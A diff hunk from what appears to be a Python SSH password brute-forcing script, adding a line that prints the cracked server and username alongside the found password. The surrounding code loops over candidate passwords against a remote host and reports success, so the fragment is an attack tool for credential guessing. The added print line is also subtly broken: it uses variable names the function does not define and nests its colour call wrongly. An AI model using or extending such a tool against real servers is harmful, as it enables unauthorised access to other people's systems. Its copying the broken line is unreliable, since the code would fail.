@@ -31,6 +31,7 @@ def brute(ip, user, passwd):
                 try:
                     client.connect(hostname=ip, username=user, password=word, timeout=3)
                     print(c("PASSWORD FOUND :", "red"), c(d.now().strftime("(%d/%m/%Y - %H:%M:%S)"), "blue"))
+                    print(c("SERVER :", "red"), c(server, "green"), c("USERNAME :", c(username, "red"))
                     print(c("PASSWORD :", "red"), c(word, "green"))
                     return True
                 except Exception as e:
